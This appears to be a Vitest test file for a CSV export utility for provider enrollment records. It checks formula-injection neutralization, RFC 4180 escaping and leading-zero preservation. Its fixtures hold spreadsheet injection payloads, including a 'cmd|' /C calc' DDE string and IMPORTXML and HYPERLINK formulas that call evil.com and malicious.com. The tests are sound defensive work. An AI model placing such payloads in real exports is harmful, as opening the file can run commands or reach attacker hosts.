import { describe, expect, it } from "vitest";
import {
  formatTextIdentifier,
  generateEnrollmentExplorerCsv,
  sanitizeCsvValue,
  type EnrollmentExportRecord,
} from "./enrollmentExplorerExport";

describe("enrollmentExplorerExport CSV utility", () => {
  describe("sanitizeCsvValue", () => {
    it("neutralizes formula injection with a leading single quote", () => {
      expect(sanitizeCsvValue("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
      expect(sanitizeCsvValue("+12345")).toBe("'+12345");
      expect(sanitizeCsvValue("-cmd|' /C calc'!A0")).toBe("'-cmd|' /C calc'!A0");
      expect(sanitizeCsvValue("@IMPORTXML('http://evil.com')")).toBe("'@IMPORTXML('http://evil.com')");
    });

    it("escapes double quotes and commas according to RFC 4180", () => {
      expect(sanitizeCsvValue('Hello, "World"')).toBe('"Hello, ""World"""');
      expect(sanitizeCsvValue("Multi\nLine")).toBe('"Multi\nLine"');
    });

    it("handles null and undefined values as empty strings", () => {
      expect(sanitizeCsvValue(null)).toBe("");
      expect(sanitizeCsvValue(undefined)).toBe("");
      expect(sanitizeCsvValue("")).toBe("");
    });
  });

  describe("formatTextIdentifier", () => {
    it("preserves leading zeros with single quote prefix", () => {
      expect(formatTextIdentifier("0123456789")).toBe("'0123456789");
      expect(formatTextIdentifier("0098765432")).toBe("'0098765432");
      expect(formatTextIdentifier("")).toBe("");
      expect(formatTextIdentifier(null)).toBe("");
    });
  });

  describe("generateEnrollmentExplorerCsv", () => {
    it("generates valid RFC 4180 CSV with UTF-8 BOM and correct column headers", () => {
      const records: EnrollmentExportRecord[] = [
        {
          providerName: "Miller, Jane",
          npi: "0123456789",
          discipline: "PT",
          groupName: "Alpha Therapy Group",
          payerName: "Blue Cross Blue Shield",
          productName: "Commercial PPO",
          state: "CO",
          facilityName: "Denver Clinic",
          status: "Approved",
          publicationState: "Published",
          effectiveDate: "2026-08-01",
          actionOwner: "Minted Panel",
          blockerReason: null,
          payerReference: "BCBS-99128",
          retroWindow: "90 days",
          proofCount: 2,
        },
        {
          providerName: "Doe, John",
          npi: "9876543210",
          discipline: "OT",
          groupName: "Alpha Therapy Group",
          payerName: "Aetna",
          productName: "Medicare Advantage",
          state: "CO",
          facilityName: "Boulder Clinic",
          status: "Action Required",
          publicationState: "Published",
          effectiveDate: null,
          actionOwner: "Client",
          blockerReason: "=HYPERLINK(\"http://malicious.com\")",
          payerReference: null,
          retroWindow: null,
          proofCount: 0,
        },
      ];

      const csv = generateEnrollmentExplorerCsv(records);
      expect(csv.startsWith("\uFEFF")).toBe(true);

      const lines = csv.slice(1).split("\r\n");
      expect(lines).toHaveLength(3); // 1 header + 2 records

      // Header checks
      expect(lines[0]).toContain("Provider Name,NPI,Discipline,Provider Group,Payer,Product");

      // Record 1: Check leading zero preservation and clean values
      expect(lines[1]).toContain('"Miller, Jane"');
      expect(lines[1]).toContain("'0123456789");
      expect(lines[1]).toContain("Approved");
      expect(lines[1]).toContain("2026-08-01");

      // Record 2: Check formula neutralization on blocker reason
      expect(lines[2]).toContain('"Doe, John"');
      expect(lines[2]).toContain("Action Required");
      expect(lines[2]).toContain("'=HYPERLINK");
    });
  });
});
